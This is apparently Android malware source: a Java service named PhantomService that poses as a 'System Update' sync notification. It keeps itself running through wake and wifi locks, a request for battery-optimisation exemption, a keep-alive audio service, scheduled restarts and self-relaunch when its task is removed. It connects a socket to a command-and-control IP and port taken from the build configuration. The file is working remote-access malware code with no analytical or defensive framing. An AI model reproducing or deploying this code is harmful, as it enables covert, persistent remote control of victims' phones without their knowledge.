package com.systemupdate.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;

public class PhantomService extends Service {
    private static final String CHANNEL_ID = "sys_service";
    private static final int NOTIFICATION_ID = 1001;
    private SocketManager socketManager;
    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            createNotificationChannel();
            startForeground(NOTIFICATION_ID, buildNotification());
        } catch (Throwable t) { }
        
        try { requestBatteryExemption(); } catch (Throwable t) { }
        
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sys:service");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire();
            }
        } catch (Throwable t) { }

        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "sys:wifi");
                wifiLock.setReferenceCounted(false);
                wifiLock.acquire();
            }
        } catch (Throwable t) { }

        startSocket();
        
        try {
            Intent ka = new Intent(this, KeepAliveAudioService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(ka);
            else startService(ka);
        } catch (Throwable t) { }
        
        try { PersistentRestartReceiver.scheduleNext(this, 60000); } catch (Throwable t) { }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (socketManager == null) startSocket();
        return START_STICKY;
    }

    private void requestBatteryExemption() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(i);
                }
            }
        } catch (Throwable t) { }
    }

    private void startSocket() {
        try {
            String ip = BuildConfig.C2_DEFAULT_IP;
            int port = BuildConfig.C2_DEFAULT_PORT;
            socketManager = new SocketManager(getApplicationContext(), ip, port);
            socketManager.connect();
        } catch (Throwable t) { }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    private Notification buildNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags |= PendingIntent.FLAG_IMMUTABLE;
        PendingIntent pi = PendingIntent.getActivity(this, 0, intent, flags);

        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);
        return b.setContentTitle("System Update").setContentText("Syncing...").setSmallIcon(android.R.drawable.stat_notify_sync).setContentIntent(pi).setOngoing(true).build();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restart = new Intent(getApplicationContext(), PhantomService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) getApplicationContext().startForegroundService(restart);
        else getApplicationContext().startService(restart);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        if (socketManager != null) { socketManager.disconnect(); socketManager = null; }
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        if (wifiLock != null && wifiLock.isHeld()) wifiLock.release();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}